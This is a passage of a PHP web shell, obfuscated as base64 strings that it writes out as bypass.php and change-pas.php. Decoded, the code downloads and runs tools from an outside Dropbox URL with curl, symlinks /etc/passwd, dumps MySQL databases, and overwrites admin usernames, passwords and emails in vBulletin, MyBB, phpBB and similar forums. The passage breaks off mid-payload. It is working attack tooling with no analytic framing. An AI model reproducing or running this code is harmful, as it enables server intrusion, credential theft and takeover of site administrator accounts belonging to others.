LCJ3KyIpOwokd3JpdGUgPSBmd3JpdGUgKCRmaWxlICxiYXNlNjRfZGVjb2RlKCRjb25maWdzaGVsbCkpOwpmY2xvc2UoJGZpbGUpOwogICAgY2htb2QoImNvbmZpZy5pem8iLDA3NTUpOwogICBlY2hvICI8aWZyYW1lIHNyYz1hbGxjb25maWcvY29uZmlnLml6byB3aWR0aD0xMDAlIGhlaWdodD0xMDAlIGZyYW1lYm9yZGVyPTA+PC9pZnJhbWU+ICI7Cn0KaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTUnXSkpCnsKICAgIG1rZGlyKCdieXBhc3NiaW4nLCAwNzU1KTsKICAgIGNoZGlyKCdieXBhc3NiaW4nKTsKCkBleGVjKCdjdXJsIGh0dHA6Ly9kbC5kcm9wYm94LmNvbS91Lzc0NDI1MzkxL2J5cGFzcy50YXIuZ3ogLW8gYnlwYXNzLnRhci5neicpOwpAZXhlYygndGFyIC14dmYgYnlwYXNzLnRhci5neicpOwpAZXhlYygnY2htb2QgNzU1IC4vYnlwYXNzL2xuJyk7CkBleGVjKCcuL2J5cGFzcy9sbiAtcyAvZXRjL3Bhc3N3ZCAxLnR4dCcpOwogICBlY2hvICI8aWZyYW1lIHNyYz1ieXBhc3NiaW4vYnlwYXNzLzEudHh0IHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQoKaWYgKGlzc2V0KCRfUE9TVFsnU3VibWl0MTYnXSkpCnsKQG1rZGlyKCJteXNxbGR1bXBlciIpOwpAY2hkaXIoIm15c3FsZHVtcGVyIik7CkBleGVjKCdjdXJsIGh0dHA6Ly9kbC5kcm9wYm94LmNvbS91Lzc0NDI1MzkxL215c3FsZHVtcGVyLnRhci5neiAtbyBteXNxbGR1bXBlci50YXIuZ3onKTsKQGV4ZWMoJ3RhciAteHZmIG15c3FsZHVtcGVyLnRhci5neicpOwoJZWNobyAiPGlmcmFtZSBzcmM9bXlzcWxkdW1wZXIvaW5kZXgucGhwIHdpZHRoPTEwMCUgaGVpZ2h0PTEwMCUgZnJhbWVib3JkZXI9MD48L2lmcmFtZT4gIjsKfQo/PgoKICAgICAgICA8dGQgY2xhc3M9J3RkJyBzdHlsZT0nYm9yZGVyLWJvdHRvbS13aWR0aDp0aGluO2JvcmRlci10b3Atd2lkdGg6dGhpbic+PGZvcm0gbmFtZT0nRjEnIG1ldGhvZD0ncG9zdCc+CiAgICAgICAgICAgIDxkaXYgYWxpZ249J2xlZnQnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDE0JyB2YWx1ZT0nICAgICBQeXRob24gICAgJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxMycgdmFsdWU9JyAgICAgICBDZ2kgICAgICc+CiAgICAgICAgICAgICAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTEnIHZhbHVlPScgc3ltIGFsbCBjb25maWcnPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEyJyB2YWx1ZT0nICBzeW0gbGpuayB1c2VyJz4KCQkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSdTdWJtaXQxNScgdmFsdWU9JyAgICAvZXRjL3Bhc3N3ZCc+CgkJCSAgPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0nU3VibWl0MTYnIHZhbHVlPScgIG15IHNxbCBkdW1wZXInPgoJCQkgIDxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J1N1Ym1pdDEwJyB2YWx1ZT0nQnkgUGFzcyBTeW0uVGFyJz4KCQkJICA8L2Zvcm0+CiAgICA8L3RkPgogICAKPC9ib2R5Pgo8L2h0bWw+
';
$file = fopen("bypass.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
   echo "<iframe src=bypass.php width=100% height=720px frameborder=0></iframe> ";
}//end bypass

elseif ($action == 'changepas') {
$file = fopen($dir."change-pas.php" ,"w+");
$perltoolss = 'PD9waHAKLy9CZWdpbmluZyBvZiBDb2RpbmcKZXJyb3JfcmVwb3J0aW5nKDApOwogICAgJGluZm8gPSAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ107CiAgICAkc2l0ZSA9IGdldGVudigiSFRUUF9IT1NUIik7CiAgICAkcGFnZSA9ICRfU0VSVkVSWydTQ1JJUFRfTkFNRSddOwogICAgJHNuYW1lID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiAgICAkdW5hbWUgPSBwaHBfdW5hbWUoKTsKICAgICRzbW9kID0gaW5pX2dldCgnc2FmZV9tb2RlJyk7CiAgICAkZGlzZnVuYyA9IGluaV9nZXQoJ2Rpc2FibGVfZnVuY3Rpb25zJyk7CiAgICAkeW91cmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107CiAgICAkc2VydmVyaXAgPSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXTsKCQovL1RpdGxlCmVjaG8gIjxoZWFkPgo8c3R5bGU+CmJvZHkgeyBmb250LXNpemU6IDEycHg7CiAgICAgICAgICAgZm9udC1mYW1pbHk6IGFyaWFsLCBoZWx2ZXRpY2E7CiAgICAgICAgICAgIHNjcm9sbGJhci13aWR0aDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWhlaWdodDogNTsKICAgICAgICAgICAgc2Nyb2xsYmFyLWZhY2UtY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItc2hhZG93LWNvbG9yOiBzaWx2ZXI7CiAgICAgICAgICAgIHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6IHNpbHZlcjsKICAgICAgICAgICAgc2Nyb2xsYmFyLTNkbGlnaHQtY29sb3I6c2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItZGFya3NoYWRvdy1jb2xvcjogc2lsdmVyOwogICAgICAgICAgICBzY3JvbGxiYXItdHJhY2stY29sb3I6IGJsYWNrOwogICAgICAgICAgICBzY3JvbGxiYXItYXJyb3ctY29sb3I6IHNpbHZlcjsKICAgIH0KPC9zdHlsZT4KPHRpdGxlPkt5bUxqbmsgLSBbJHNpdGVdPC90aXRsZT48L2hlYWQ+IjsKLy9CdXR0b24gTGlzdAplY2hvICI8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbicnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXZidWxsZXRpbiB2YWx1ZT0ndkJ1bGxldGluJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1teWJiIHZhbHVlPSdNeUJCJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1waHBiYiB2YWx1ZT0ncGhwQkInPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXNtZiB2YWx1ZT0nU01GJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT13aG1jcyB2YWx1ZT0nV0hNQ1MnPjxpbnB1dCB0eXBlPXN1Ym1pdCBuYW1lPXdvcmRwcmVzcyB2YWx1ZT0nV29yZFByZXNzJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1qb29tbGEgdmFsdWU9J0pvb21sYSc+PGlucHV0IHR5cGU9c3VibWl0IG5hbWU9cGhwLW51a2UgdmFsdWU9J1BIUC1OVUtFJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT11cCB2YWx1ZT0nVHJhaWRudCBVUCc+PC9mb3JtPjwvY2VudGVyPiI7CmZ1bmN0aW9uIHVwZGF0ZSgpCnsKCWVjaG8gIlsrXSBVcGRhdGUgSGFzIERvbmUgXl9eIjsKfQovL3ZCdWxsZXRpbgppZiAoaXNzZXQoJF9QT1NUWyd2YnVsbGV0aW4nXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHZCdWxsZXRpbiBJbmZvPGJyPlBhdGNoIENvbnRyb2wgUGFuZWwgOiBbcGF0Y2hdL2FkbWluY3A8YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2luY2x1ZGVzL2NvbmZpZy5waHA8YnI+aW5jbHVkZXMvaW5pdC5waHAgPC9mb250Pgo8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyNGRjAwMDAnPj4+PC9mb250Pjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+IGluY2x1ZGVzL2NsYXNzX2NvcmUucGhwIDwvZm9udD4KPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjRkYwMDAwJz4+PjwvZm9udD48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPiBpbmNsdWRlcy9jb25maWcucGhwPC9mb250PjwvY2VudGVyPgogICAgPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb249Jyc+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5NeXNxbCBIb3N0PC9mb250Pjxicj48aW5wdXQgdmFsdWU9bG9jYWxob3N0IHR5cGU9dGV4dCBuYW1lPWRiaHZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1mb3J1bXMgdHlwZT10ZXh0IG5hbWU9ZGJudmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1dmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwdmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9dmJfIHR5cGU9dGV4dCBuYW1lPXBydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPWFkbWluIHR5cGU9dGV4dCBuYW1lPXVydmIgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TmV3IHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHN2YiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5OZXcgRS1tYWlsIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9eW91ci1lbWFpbEB4eHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbXZiIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjxicj4KICAgICAgICAgIDwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHZiID0gJF9QT1NUWydkYmh2YiddOwokZGJudmIgID0gJF9QT1NUWydkYm52YiddOwokZGJ1dmIgPSAkX1BPU1RbJ2RidXZiJ107CiRkYnB2YiAgPSAkX1BPU1RbJ2RicHZiJ107CiAgICAgICAgIEBteXNxbF9jb25uZWN0KCRkYmh2YiwkZGJ1dmIsJGRicHZiKTsKICAgICAgICAgQG15c3FsX3NlbGVjdF9kYigkZGJudmIpOwoKJHVydmI9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJHVydmIpOwoKJHNldF91cnZiID0gJF9QT1NUWyd1cnZiJ107CgokcHN2Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkcHN2Yik7CiRwYXNzX3ZiID0gJF9QT1NUWydwc3ZiJ107CgokZW12Yj1zdHJfcmVwbGFjZSgiXCciLCInIiwkZW12Yik7CiRzZXRfZW12YiA9ICRfUE9TVFsnZW12YiddOwoKJHZiX3ByZWZpeCA9ICRfUE9TVFsncHJ2YiddOwoKJHRhYmxlX25hbWUgPSAkdmJfcHJlZml4LiJ1c2VyIiA7CgokcXVlcnkgPSAnc2VsZWN0ICogZnJvbSAnIC4gJHRhYmxlX25hbWUgLiAnIHdoZXJlIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRyZXN1bHQgPSBteXNxbF9xdWVyeSgkcXVlcnkpOwokcm93ID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlc3VsdCk7CiRzYWx0ID0gJHJvd1snc2FsdCddOwokcGFzczIgPSBtZDUoJHBhc3NfdmIpOwokcGFzcyA9JHBhc3MyIC4gJHNhbHQ7Cgokc2V0X3Bzc2FsdCA9IG1kNSgkcGFzcyk7CgokbGVjb25ndGhpZW4xID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBwYXNzd29yZD0iJyAuICRzZXRfcHNzYWx0IC4gJyIgV0hFUkUgdXNlcm5hbWU9IicgLiAkc2V0X3VydmIgLiAnIjsnOwokbGVjb25ndGhpZW4yID0gJ1VQREFURSAnIC4gJHRhYmxlX25hbWUgLiAnIFNFVCBlbWFpbD0iJyAuICRzZXRfZW12YiAuICciIFdIRVJFIHVzZXJuYW1lPSInIC4gJHNldF91cnZiIC4gJyI7JzsKCiRvazE9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjEpOwokb2sxPUBteXNxbF9xdWVyeSgkbGVjb25ndGhpZW4yKTsKCmlmKCRvazEpewplY2hvICI8c2NyaXB0PmFsZXJ0KCd2QnVsbGV0aW4gdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9NeUJCCmlmIChpc3NldCgkX1BPU1RbJ215YmInXSkpCnsKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPgo8dHI+PHRkPgo8Y2VudGVyPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIE15QkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG1pbjxicj5QYXRoIENvbmZpZyA6IFtwYXRjaF0vaW5jL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJobXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgbmFtZTxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmIgdHlwZT10ZXh0IG5hbWU9ZGJubXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1bXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgcGFzc3dvcmQ8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1hZG1pbiB0eXBlPXBhc3N3b3JkIG5hbWU9ZGJwbXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHVzZXIgYWRtaW48YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1LeW1Mam5rIHR5cGU9dGV4dCBuYW1lPXVybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIEUtbWFpbCBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXlvdXItZW1haWxAeHh4LmNvbSB0eXBlPXRleHQgbmFtZT1lbW15IHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPlRhYmxlIHByZWZpeDxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPW15YmJfIHR5cGU9dGV4dCBuYW1lPXBybXkgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nQ2hhbmdlJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7Cn1lbHNlewokZGJobXkgPSAkX1BPU1RbJ2RiaG15J107CiRkYm5teSAgPSAkX1BPU1RbJ2Ribm15J107CiRkYnVteSA9ICRfUE9TVFsnZGJ1bXknXTsKJGRicG15ICA9ICRfUE9TVFsnZGJwbXknXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaG15LCRkYnVteSwkZGJwbXkpOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5teSk7CgokdXJteT1zdHJfcmVwbGFjZSgiXCciLCInIiwkdXJteSk7CiRzZXRfdXJteSA9ICRfUE9TVFsndXJteSddOwoKJGVtbXk9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGVtbXkpOwokc2V0X2VtbXkgPSAkX1BPU1RbJ2VtbXknXTsKCiRteV9wcmVmaXggPSAkX1BPU1RbJ3BybXknXTsKCiR0YWJsZV9uYW1lMSA9ICRteV9wcmVmaXguInVzZXJzIiA7CgokbGVjb25ndGhpZW4zID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIHVzZXJuYW1lID0nIi4kc2V0X3VybXkuIicgV0hFUkUgdWlkID0nMSciOwokbGVjb25ndGhpZW40ID0gIlVQREFURSAkdGFibGVfbmFtZTEgU0VUIGVtYWlsID0nIi4kc2V0X2VtbXkuIicgV0hFUkUgdWlkID0nMSciOwoKJG9rMj1AbXlzcWxfcXVlcnkoJGxlY29uZ3RoaWVuMyk7CiRvazI9QG15c3FsX3F1ZXJ5KCRsZWNvbmd0aGllbjQpOwoKaWYoJG9rMil7CmVjaG8gIjxzY3JpcHQ+YWxlcnQoJ015QkIgdXBkYXRlIHN1Y2Nlc3MgLiBUaGFuayBLeW1Mam5rIHZlcnkgbXVjaCA7KScpOzwvc2NyaXB0PiI7Cn0KfQoKLy9waHBCQgppZiAoaXNzZXQoJF9QT1NUWydwaHBiYiddKSkKewplY2hvICI8Y2VudGVyPjx0YWJsZSBib3JkZXI9MCB3aWR0aD0nMTAwJSc+Cjx0cj48dGQ+CjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgcGhwQkIgSW5mbzxicj5QYXRjaCBDb250cm9sIFBhbmVsIDogW3BhdGNoXS9hZG08YnI+UGF0aCBDb25maWcgOiBbcGF0Y2hdL2NvbmZpZy5waHA8L2ZvbnQ+PC9jZW50ZXI+CiAgICA8Y2VudGVyPjxmb3JtIG1ldGhvZD1QT1NUIGFjdGlvbj0nJz48Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPk15c3FsIEhvc3Q8L2ZvbnQ+PGJyPjxpbnB1dCB2YWx1ZT1sb2NhbGhvc3QgdHlwZT10ZXh0IG5hbWU9ZGJocGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIG5hbWU8YnI+PC9mb250PjxpbnB1dCB2YWx1ZT1waHBiYiB0eXBlPXRleHQgbmFtZT1kYm5waHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+REIgdXNlcjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPXJvb3QgdHlwZT10ZXh0IG5hbWU9ZGJ1cGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRCIHBhc3N3b3JkPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9YWRtaW4gdHlwZT1wYXNzd29yZCBuYW1lPWRicHBocCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPgogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5DaGFuZ2UgdXNlciBhZG1pbjxicj48L2ZvbnQ+PGlucHV0IHZhbHVlPUt5bUxqbmsgdHlwZT10ZXh0IG5hbWU9dXJwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+Q2hhbmdlIHBhc3N3b3JkIGFkbWluPGJyPjwvZm9udD48aW5wdXQgdmFsdWU9S3ltTGpuayB0eXBlPXBhc3N3b3JkIG5hbWU9cHNwaHAgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4KICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+VGFibGUgcHJlZml4PGJyPjwvZm9udD48aW5wdXQgdmFsdWU9cGhwYmJfIHR5cGU9dGV4dCBuYW1lPXBycGhwIHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+CiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0NoYW5nZScgPjwvZm9ybT48L2NlbnRlcj48L3RkPjwvdHI+PC90YWJsZT48L2NlbnRlcj4iOwp9ZWxzZXsKJGRiaHBocCA9ICRfUE9TVFsnZGJocGhwJ107CiRkYm5waHAgID0gJF9QT1NUWydkYm5waHAnXTsKJGRidXBocCA9ICRfUE9TVFsnZGJ1cGhwJ107CiRkYnBwaHAgID0gJF9QT1NUWydkYnBwaHAnXTsKICAgICAgICAgQG15c3FsX2Nvbm5lY3QoJGRiaHBocCwkZGJ1cGhwLCRkYnBwaHApOwogICAgICAgICBAbXlzcWxfc2VsZWN0X2RiKCRkYm5waHApOwoKJHVycGhwPXN0cl9yZXBsYWNlKCJcJyIsIiciLCR1cnBocCk7CiRzZXRfdXJwaHAgPSAkX1BPU1RbJ3VycGhw